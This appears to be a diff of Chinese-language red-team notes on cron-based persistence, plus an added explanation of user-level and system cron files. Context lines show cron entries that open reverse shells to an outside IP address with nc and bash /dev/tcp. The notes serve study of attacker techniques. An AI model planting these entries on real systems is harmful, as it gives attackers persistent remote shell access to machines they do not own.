@@ -1508,7 +1508,7 @@ tracert -d 10.10.33.224
 计划任务
 
 Centos
-[root@localhost ~]# crontab -e                               #编辑计划任务(不需要用户名)
+[root@localhost ~]# crontab -e                               #编辑计划任务(不需要用户名:)
 * * * * * /usr/bin/nc 175.24.115.4 5555 -e /bin/sh
 [root@localhost ~]# cat /var/spool/cron/root                 #查看计划任务文件
 */1 * * * * /usr/bin/nc 175.24.115.4 5555 -e /bin/sh
@@ -1532,9 +1532,6 @@ MAILTO=root
 # *  *  *  *  * user-name  command to be executed
 #*/1 * * * * root /bin/bash -i >& /dev/tcp/175.24.115.4/5555 0>&1          #添加该行，需要用户名
 [root@localhost etc]#
-
-
-
 
 Ubuntu
 zhangxin@zhangxin-virtual-machine:~$ crontab -e             #编辑计划任务(不需要用户名)
@@ -1567,6 +1564,23 @@ root@Ubuntu:log# tail -f /var/log/syslog                           #查看日志
 
 参考：
 https://www.yuque.com/tidesec/redteam/myy0vw
+
+
+解释：
+1.crontab -e
+这个命令用于创建或编辑当前用户的Cron任务列表。当你运行这个命令时，它会打开一个编辑器，你可以在其中添加、修改或删除当前用户的定时任务。
+
+
+2. /var/spool/cron/root或/var/spool/cron/crontabs/zhangxin
+这个文件是用来存储root用户的Cron任务列表的。当你使用命令"sudo crontab -e"来编辑root用户的Cron任务列表时，编辑器打开的就是这个文件。
+
+3. /etc/crontab
+这个文件是一个系统范围的Cron配置文件，它包含了系统中所有用户的定时任务。在这个文件中，你可以定义系统级别的任务，这些任务对于所有用户都是相同的。
+
+总的来说，crontab -e 和 /var/spool/cron/root 是用户级别的Cron文件，而 /etc/crontab 是系统级别的Cron文件。它们之间的关系是，当你使用crontab -e命令编辑当前用户的Cron任务列表时，你所编辑的任务会被存储到/var/spool/cron/目录下的对应文件中；而当你在/etc/crontab文件中定义一个系统级别的任务时，这个任务会被应用于所有用户。
+
+
+
 
 ------------------------------------------------------------------------------------------
 补充：
